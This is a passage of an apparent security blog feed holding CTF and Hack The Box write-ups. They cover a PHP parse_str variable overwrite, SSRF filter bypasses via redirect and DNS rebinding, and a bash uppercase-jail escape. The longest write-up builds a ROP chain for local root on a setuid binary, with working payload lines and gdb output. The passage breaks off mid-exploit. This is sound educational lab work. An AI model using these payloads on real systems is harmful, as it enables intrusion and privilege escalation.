+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$hashed_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff&#39;</span>;
+$parsed <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>]);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($parsed[<span style="color:#e6db74">&#34;query&#34;</span>])){
+    $query <span style="color:#f92672">=</span> $parsed[<span style="color:#e6db74">&#34;query&#34;</span>];
+<span style="display:block;width:100%;background-color:#3c3d38">    $parsed_query <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_str</span>($query);
+</span>    <span style="color:#66d9ef">if</span>($parsed_query<span style="color:#f92672">!=</span><span style="color:#66d9ef">NULL</span>){
+        $action <span style="color:#f92672">=</span> $parsed_query[<span style="color:#e6db74">&#39;action&#39;</span>];
+    }
+
+    <span style="color:#66d9ef">if</span>($action<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;auth&#34;</span>){
+        $key <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;key&#34;</span>];
+        $hashed_input <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $key);
+        <span style="color:#75715e">//echo $hashed_input.&#39;\n&#39;;
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>($hashed_input<span style="color:#f92672">!==</span>$hashed_key){
+            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;GTFO!&#34;</span>);
+        }
+
+        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+<span style="color:#75715e">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+
+<p>The bug is on line <code>6</code>, where user controlled variable is being run through <code>parse_str()</code> function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$parsed_query = parse_str($query);</code></pre></div>
+<p>Regarding to the PHP manual:
+&gt; parse_str - Parses the string into variables</p>
+
+<p>Knowing that, we may assume that by controlling the <code>query</code> string we can set any variable.
+Let&rsquo;s break it down.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">[~]$ php -a
+Interactive shell
+
+php &gt; $hashed_key = &#39;79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff&#39;;
+php &gt; $query = &#34;action=auth&amp;key=aaa&#34;;
+php &gt; parse_str($query);
+php &gt; echo $action;
+auth
+php &gt; echo $key;
+aaa
+php &gt; $query = &#34;action=auth&amp;hashed_key=pwned&#34;;
+php &gt; parse_str($query);
+php &gt; echo $hashed_key;
+pwned</code></pre></div>
+<p>The solve is trival, we need to pass valid <code>key</code> and its <code>sha256</code> hash:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ echo -n test | sha256sum 
+9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</code></pre></div>
+<p>Final query:</p>
+
+<pre><code>?action=auth&amp;hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&amp;key=test
+</code></pre>
+
+<p>flag:</p>
+
+<pre><code>flag{ezPz_pHp_0b9fd0f8}
+</code></pre>
+
+<h2 id="online-previewer-1">Online Previewer 1</h2>
+
+<p>By visiting the chall url we can find something that seems to be the <code>web proxy</code>:</p>
+
+<p><img src="/posts/static/web2.png" alt="" /></p>
+
+<p>There is a hint in the html code:</p>
+
+<p><img src="/posts/static/web1.png" alt="" /></p>
+
+<p>Basically, we need to do SSRF to get the flag. Problem is that any reference to localhost is being filtered by the web app:</p>
+
+<p><img src="/posts/static/web3.png" alt="" /></p>
+
+<p>After trying quite a few payloads, such as transforming <code>127.0.0.1</code> into integer, injecting known bypasses such as <code>0://evil.com:80,google.com:80/</code> or trying some php filters; the results were not promising. Then I realised that since I can point that proxy anywhere, I could try to use the redirection (301,302).</p>
+
+<p>I&rsquo;ve spawned a php webserver and hosted simple piece of code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: http://127.0.0.1:1337/&#39;</span>, <span style="color:#66d9ef">true</span>, <span style="color:#ae81ff">301</span>);
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div>
+<p>Then I pointed the <code>web proxy</code> to my vps ip:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/tmp$ php -S <span style="color:#ae81ff">0</span>.0.0.0:8080
+PHP <span style="color:#ae81ff">7</span>.0.33-0+deb9u3 Development Server started at Fri Apr <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">22</span>:47:59 <span style="color:#ae81ff">2019</span>
+Listening on http://0.0.0.0:8080
+Document root is /tmp
+Press Ctrl-C to quit.
+<span style="color:#f92672">[</span>Fri Apr <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">22</span>:50:03 <span style="color:#ae81ff">2019</span><span style="color:#f92672">]</span> <span style="color:#ae81ff">35</span>.154.144.251:58234 <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span><span style="color:#f92672">]</span>: /</code></pre></div>
+<p>and..</p>
+
+<p><img src="/posts/static/web4.png" alt="" /></p>
+
+<h2 id="online-previewer-2">Online Previewer 2</h2>
+
+<p>Additional checks were introduced into that level. I was trying a bit more sophisticated payloads or redirects but nothing worked.</p>
+
+<p>After some time I found a similar challenge: <code>list0r (web 400)</code> from <code>33c3ctf</code>. As it turned out, the challanges were very similar.</p>
+
+<p>I&rsquo;ve assigned two <code>A</code> records to my domain:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ dig <span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>.cc @8.8.8.8 A +short
+<span style="color:#f92672">[</span>redacted<span style="color:#f92672">]</span>
+<span style="color:#ae81ff">127</span>.0.0.1
+<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ </code></pre></div>
+<p>After few tryouts I was able to recover the flag:</p>
+
+<p><img src="/posts/static/web5.png" alt="" /></p>
+
+<h2 id="bash-fu">Bash-fu</h2>
+
+<p>All commands are transformed into uppercase:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ nc -v <span style="color:#ae81ff">13</span>.234.130.76 <span style="color:#ae81ff">7002</span>
+Connection to <span style="color:#ae81ff">13</span>.234.130.76 <span style="color:#ae81ff">7002</span> port <span style="color:#f92672">[</span>tcp/afs3-prserver<span style="color:#f92672">]</span> succeeded!
+bash: cannot set terminal process group <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>: Not a tty
+bash: no job control in this shell
+bash-4.4$ id
+id
+bash: ID: command not found
+bash-4.4$ /???/???
+/???/???
+bash: /???/???: No such file or directory</code></pre></div>
+<p>It was possible to bypass the restrictions by using bash builtin string transformations:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.4$ a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id&#34;</span>; <span style="color:#e6db74">${</span>a,,<span style="color:#e6db74">}</span>
+a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id&#34;</span>; <span style="color:#e6db74">${</span>a,,<span style="color:#e6db74">}</span>
+uid<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span><span style="color:#f92672">(</span>convict<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>
+bash-4.4$ a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ls -la /jail&#34;</span>; <span style="color:#e6db74">${</span>a,,<span style="color:#e6db74">}</span>
+a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ls -la /jail&#34;</span>; <span style="color:#e6db74">${</span>a,,<span style="color:#e6db74">}</span>
+total <span style="color:#ae81ff">16</span>
+drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">03</span>:22 .
+drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">03</span>:23 ..
+-rw-r--r--    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">32</span> Apr <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">21</span>:32 flag.txt
+-rwxrwxrwx    <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">466</span> Apr <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">16</span>:45 jail
+bash-4.4$ a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat /jail/flag.txt&#34;</span>; <span style="color:#e6db74">${</span>a,,<span style="color:#e6db74">}</span>
+a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat /jail/flag.txt&#34;</span>; <span style="color:#e6db74">${</span>a,,<span style="color:#e6db74">}</span>
+flag<span style="color:#f92672">{</span>b@$h_jails_are_3asy_p3@sy<span style="color:#f92672">}</span></code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Redcross local root (basic rop)</title>
+            <link>https://asimuntis.github.io/posts/2019/04/htb-redcross-local-root-basic-rop/</link>
+            <pubDate>Sat, 13 Apr 2019 00:00:00 +0000</pubDate>
+            
+            <guid>https://asimuntis.github.io/posts/2019/04/htb-redcross-local-root-basic-rop/</guid>
+            <description>Warmup post about the alternative way of rooting the Redcross box.
+Target binary:
+iptctl: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped &amp;gt; source was also available on the host: /var/jail/home/public/src/iptctl.c  Ideally we could easily reach the vulnerable part of the code:
+if(argc==2){ if(strstr(argv[1],&amp;#34;-i&amp;#34;)) interactive(inputAddress, inputAction, argv[0]); } else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); } ..but let&amp;rsquo;s pick the other way.
+recon The interactive() function looks interesting:</description>
+            <content type="html"><![CDATA[
+
+<p><br>
+Warmup post about the alternative way of rooting the Redcross box.</p>
+
+<p>Target binary:</p>
+
+<pre><code>iptctl: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped
+&gt; source was also available on the host: /var/jail/home/public/src/iptctl.c
+</code></pre>
+
+<p>Ideally we could easily reach the vulnerable part of the code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span>(argc<span style="color:#f92672">==</span><span style="color:#ae81ff">2</span>){
+    <span style="color:#66d9ef">if</span>(strstr(argv[<span style="color:#ae81ff">1</span>],<span style="color:#e6db74">&#34;-i&#34;</span>)) interactive(inputAddress, inputAction, argv[<span style="color:#ae81ff">0</span>]);
+    }
+    <span style="color:#66d9ef">else</span>{
+        strcpy(inputAction, argv[<span style="color:#ae81ff">1</span>]);
+        strcpy(inputAddress, argv[<span style="color:#ae81ff">2</span>]);
+}</code></pre></div>
+<p>..but let&rsquo;s pick the other way.</p>
+
+<h2 id="recon">recon</h2>
+
+<p>The <code>interactive()</code> function looks interesting:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">interactive</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ip, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>action, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name){
+    <span style="color:#66d9ef">char</span> inputAddress[<span style="color:#ae81ff">16</span>];
+    <span style="color:#66d9ef">char</span> inputAction[<span style="color:#ae81ff">10</span>];
+    printf(<span style="color:#e6db74">&#34;Entering interactive mode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;Action(allow|restrict|show): &#34;</span>);
+    fgets(inputAction,BUFFSIZE,stdin);
+    fflush(stdin);
+    printf(<span style="color:#e6db74">&#34;IP address: &#34;</span>);
+    fgets(inputAddress,BUFFSIZE,stdin);
+    fflush(stdin);
+    inputAddress[strlen(inputAddress)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span> isValidAction(inputAction) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span> isValidIpAddress(inputAddress)){
+        printf(<span style="color:#e6db74">&#34;Usage: %s allow|restrict|show IP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+        exit(<span style="color:#ae81ff">0</span>);
+    }
+    strcpy(ip, inputAddress);
+    strcpy(action, inputAction);
+    <span style="color:#66d9ef">return</span>;
+}</code></pre></div>
+<p>Fortunately, the <code>strstr()</code> was used to validate the action:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">isValidIpAddress</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ipAddress)
+{
+    <span style="color:#66d9ef">struct</span> sockaddr_in sa;
+    <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> inet_pton(AF_INET, ipAddress, <span style="color:#f92672">&amp;</span>(sa.sin_addr));
+    <span style="color:#66d9ef">return</span> result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">isValidAction</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>action){
+    <span style="color:#66d9ef">int</span> a<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">char</span> value[<span style="color:#ae81ff">10</span>];
+    strncpy(value,action,<span style="color:#ae81ff">9</span>);
+    <span style="color:#66d9ef">if</span>(strstr(value,<span style="color:#e6db74">&#34;allow&#34;</span>)) a<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">if</span>(strstr(value,<span style="color:#e6db74">&#34;restrict&#34;</span>)) a<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;
+    <span style="color:#66d9ef">if</span>(strstr(value,<span style="color:#e6db74">&#34;show&#34;</span>)) a<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>;
+    <span style="color:#66d9ef">return</span> a;
+}</code></pre></div>
+<p>also, it seems that we have a freebie from the chall author (let&rsquo;s keep it in mind for later):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span>(child_pid<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){
+    setuid(<span style="color:#ae81ff">0</span>);
+    execvp(args[<span style="color:#ae81ff">0</span>],args);
+    exit(<span style="color:#ae81ff">0</span>);
+}</code></pre></div>
+<h2 id="bypassing-aslr-nx">bypassing aslr &amp; nx</h2>
+
+<p>We can quickly try the PoC and attempt to crash the binary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">penelope@redcross:~$ python -c <span style="color:#e6db74">&#39;print &#34;allow&#34; + &#34;A&#34;*29 + &#34;\n&#34;  + &#34;127.0.0.1&#34;&#39;</span> | /opt/iptctl/iptctl -i
+Entering interactive mode
+Segmentation fault</code></pre></div>
+<p>The idea is very simple: craft payload which will bypass the initial checks (valid action and valid ip address) and then ROP using the freebies that are already in the code.</p>
+
+<pre><code>gef➤  checksec
+[+] checksec for '/home/vagrant/share/iptctl'
+Canary                        : No
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+
+penelope@redcross:~$ cat /proc/sys/kernel/randomize_va_space 
+2
+</code></pre>
+
+<p>We are dealing with <code>64bit</code> binary, stack is not executable and <code>ASLR</code> is on.<br>
+Luckily, the binary was compiled without <code>PIE</code> enabled, which will prove to be very useful later on.</p>
+
+<p>I&rsquo;ve started with copying the binary to my local vm (Ubuntu 18.04); at this point I didn&rsquo;t care too much about the libc on the target machine.
+Let&rsquo;s replicate the PoC in the gdb:</p>
+
+<pre><code>gef➤  disass interactive
+(..)
+   0x0000000000400b44 &lt;+245&gt;:   call   0x4006f0 &lt;strcpy@plt&gt;
+   0x0000000000400b49 &lt;+250&gt;:   lea    rdx,[rbp-0x1a]
+   0x0000000000400b4d &lt;+254&gt;:   mov    rax,QWORD PTR [rbp-0x30]
+   0x0000000000400b51 &lt;+258&gt;:   mov    rsi,rdx
+   0x0000000000400b54 &lt;+261&gt;:   mov    rdi,rax
+   0x0000000000400b57 &lt;+264&gt;:   call   0x4006f0 &lt;strcpy@plt&gt;
+   0x0000000000400b5c &lt;+269&gt;:   nop
+   0x0000000000400b5d &lt;+270&gt;:   leave  
+   0x0000000000400b5e &lt;+271&gt;:   ret    
+End of assembler dump.
+gef➤  b * interactive+271
+Breakpoint 1 at 0x400b5e
+gef➤  r -i &lt; &lt;(python -c 'from pwn import *; print &quot;allow&quot; + &quot;A&quot;*29 + p64(0xdeadbeef) + &quot;\n&quot;  + &quot;127.0.0.1&quot;')
+(..)
+────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;iptctl&quot;, stopped, reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400b5e → interactive()
+───────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  x/gx $rsp
+0x7fffffffe378: 0x00000000deadbeef
+gef➤  c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000deadbeef in ?? ()
+</code></pre>
+
+<p>We have full control over <code>rip</code> register.</p>
+
+<p>We already know that binary contains useful functions such as <code>setuid()</code> and <code>execvp()</code> and it&rsquo;s not <code>Position Independed Executable (PIE)</code> - what does it mean for us?
+<br><br></p>
+
+<p>In my vm I&rsquo;ve compiled two versions, with and without <code>PIE</code> enabled:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gcc -pie -fpie -o iptctl-pie iptctl.c 
+$ gcc -no-pie -fno-pie -o iptctl-nopie iptctl.c </code></pre></div>
+<p><code>nopie</code> version gives the actual runtime load address of the <code>main()</code> function, whereas, <code>PIE</code> enabled one returns the offset:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ readelf -s ./iptctl-nopie | grep main       
+     <span style="color:#ae81ff">7</span>: <span style="color:#ae81ff">0000000000000000</span>     <span style="color:#ae81ff">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">)</span>
+    <span style="color:#ae81ff">60</span>: <span style="color:#ae81ff">0000000000000000</span>     <span style="color:#ae81ff">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
+    <span style="color:#ae81ff">75</span>: 0000000000400c6c   <span style="color:#ae81ff">650</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">14</span> main
+$ readelf -s ./iptctl-pie | grep main 
+     <span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0000000000000000</span>     <span style="color:#ae81ff">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">)</span>
+    <span style="color:#ae81ff">60</span>: <span style="color:#ae81ff">0000000000000000</span>     <span style="color:#ae81ff">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
+    <span style="color:#ae81ff">75</span>: 0000000000000ed6   <span style="color:#ae81ff">670</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">14</span> main</code></pre></div>
+<p>and at runtime:</p>
+
+<pre><code>$ gdb -batch -nh -ex 'set disable-randomization off' -ex 'start' -ex 'x main' ./iptctl    
+Temporary breakpoint 1 at 0x400b63
+
+Temporary breakpoint 1, 0x0000000000400b63 in main ()
+0x400b5f &lt;main&gt;:    0xe5894855 
+
+$ gdb -batch -nh -ex 'set disable-randomization off' -ex 'start' -ex 'x main' ./iptctl   
+Temporary breakpoint 1 at 0x400b63
+
+Temporary breakpoint 1, 0x0000000000400b63 in main ()
+0x400b5f &lt;main&gt;:    0xe5894855 
+
+# PIE Enabled
+
+$ gdb -batch -nh -ex 'set disable-randomization off' -ex 'start' -ex 'x main' ./iptctl-pie
+Temporary breakpoint 1 at 0xeda
+
+Temporary breakpoint 1, 0x00005591231a5eda in main ()
+0x5591231a5ed6 &lt;main&gt;:  0xe5894855 
+
+$ gdb -batch -nh -ex 'set disable-randomization off' -ex 'start' -ex 'info proc map' -ex 'x main' ./iptctl-pie
+Temporary breakpoint 1 at 0xeda
+
+Temporary breakpoint 1, 0x000055c295cdeeda in main ()
+process 3735
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+      0x55c295cde000     0x55c295ce0000     0x2000        0x0 /tmp/iptctl-pie
+      0x55c295edf000     0x55c295ee0000     0x1000     0x1000 /tmp/iptctl-pie
+      0x55c295ee0000     0x55c295ee1000     0x1000     0x2000 /tmp/iptctl-pie
+      0x7f082a4ab000     0x7f082a66b000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7f082a66b000     0x7f082a86b000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7f082a86b000     0x7f082a86f000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7f082a86f000     0x7f082a871000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7f082a871000     0x7f082a875000     0x4000        0x0 
+      0x7f082a875000     0x7f082a89b000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7f082aa86000     0x7f082aa89000     0x3000        0x0 
+      0x7f082aa9a000     0x7f082aa9b000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7f082aa9b000     0x7f082aa9c000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7f082aa9c000     0x7f082aa9d000     0x1000        0x0 
+      0x7fff83cf3000     0x7fff83d14000    0x21000        0x0 [stack]
+      0x7fff83daf000     0x7fff83db2000     0x3000        0x0 [vvar]
+      0x7fff83db2000     0x7fff83db4000     0x2000        0x0 [vdso]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+
+0x55c295cdeed6 &lt;main&gt;:  0xe5894855
+
+$ printf &quot;0x%x\n&quot; $((0x55c295cde000+0xed6))
+0x55c295cdeed6
+</code></pre>
+
+<p>.. which basically means that on runtime <code>PIE</code> compiled binary randomises the program data and executable memory of the binary making return oriented programming attacks more difficult but not impossible (offset2lib<sup class="footnote-ref" id="fnref:1"><a href="#fn:1">1</a></sup>).</p>
+
+<blockquote>
+<p>at runtime <code>main()</code> would be @ <code>randomised binary base address + offset</code></p>
+</blockquote>
+
+<p>Luckily for us, addresses of the <code>setuid()</code> and <code>execve()</code> will be static on each execution.</p>
+
+<pre><code>0x0000000000400d00 &lt;+417&gt;:   call   0x400780 &lt;setuid@plt&gt;
+0x0000000000400d05 &lt;+422&gt;:   mov    rax,QWORD PTR [rbp-0x80]
+0x0000000000400d09 &lt;+426&gt;:   lea    rdx,[rbp-0x80]
+0x0000000000400d0d &lt;+430&gt;:   mov    rsi,rdx
+0x0000000000400d10 &lt;+433&gt;:   mov    rdi,rax
+0x0000000000400d13 &lt;+436&gt;:   call   0x400760 &lt;execvp@plt&gt;
+</code></pre>
+
+<p>What is more, binary itself contains <code>'sh'</code> string:</p>
+
+<pre><code>gef➤  search-pattern &quot;sh&quot;
+[+] Searching 'sh' in memory
+[+] In '/home/vagrant/share/iptctl'(0x400000-0x402000), permission=r-x
+  0x40046e - 0x400470  →   &quot;sh&quot; 
+
+gef➤  x/s 0x40046e
+0x40046e:   &quot;sh&quot;
+</code></pre>
+
+<p>We don&rsquo;t care about the libc on the target system, we have all that we need to perform:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">setuid(<span style="color:#ae81ff">0</span>)
+execvp(<span style="color:#e6db74">&#34;sh&#34;</span>,NULL)</code></pre></div>
+<h2 id="basic-rop-chain">basic rop chain</h2>
+
+<p>To achieve that, we will need a few gadgets. Knowing the calling convention for x64 let&rsquo;s start with jumping to <code>setuid(0)</code>
+&gt; We need to control rdi and rsi registers to perform our setuid()+execvp()<br>
+&gt; x64 calling convention:<br>
+&gt; &nbsp;&nbsp;  rdi - 1st argument<br>
+&gt; &nbsp;&nbsp;  rsi - 2nd<br>
+&gt; &nbsp;&nbsp;  (..)<br></p>
+
+<pre><code># Let's look for the gadgets using ropper:
+gef➤  ropper --search 'pop r?i'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r?i
+
+[INFO] File: /home/vagrant/share/iptctl
+0x0000000000400de3: pop rdi; ret; 
+0x0000000000400de1: pop rsi; pop r15; ret; 
+
+# setuid(0):
+payload = ''
+payload += [pop rdi; ret]
+payload += [0]
+payload += [setuid]
+
+# execvp(&quot;sh&quot;,NULL):
+payload += [pop rdi; ret]
+payload += [&quot;sh&quot; addr]
+payload += [pop rsi; pop r15; ret] 
+payload += [NULL]
+payload += [NULL]
+payload += [execvp]
+
+</code></pre>
+
+<pre><code>gef➤  b * 0x400780 # setuid()
+Breakpoint 2 at 0x400780
+gef➤  b * interactive+271
+Breakpoint 3 at 0x400b5e
+gef➤  r -i &lt; &lt;(python -c 'from pwn import *; print &quot;allow&quot; + &quot;A&quot;*29 + p64(0x400de3) + p64(0) + p64(0x400780) + &quot;\n&quot;  + &quot;127.0.0.1&quot;')
+</code></pre>
+
+<p>The <code>interactive()</code> function will return and hit our gadget, the <code>rdi</code> register will be set to <code>0</code> and then we will jump to the <code>setuid()</code>:</p>
+
+<pre><code> →   0x400b5e &lt;interactive+271&gt; ret    
+   ↳    0x400de3 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x400de4 &lt;__libc_csu_init+100&gt; ret    
+        0x400de5                  nop    
+        0x400de6                  nop    WORD PTR cs:[rax+rax*1+0x0]
+        0x400df0 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x400df2                  add    BYTE PTR [rax], al
+───────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;iptctl&quot;, stopped, reason: BREAKPOINT
+─────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400b5e → interactive()
+[#1] 0x400de3 → __libc_csu_init()
+[#2] 0x400780 → exit@plt()
+──────────────────────────────────────────────────────────────────────────────────────
+gef➤  x/3gx $rsp
+0x7fffffffe378: 0x0000000000400de3  0x0000000000000000
+0x7fffffffe388: 0x0000000000400780
+gef➤ c
+
+(..)
+
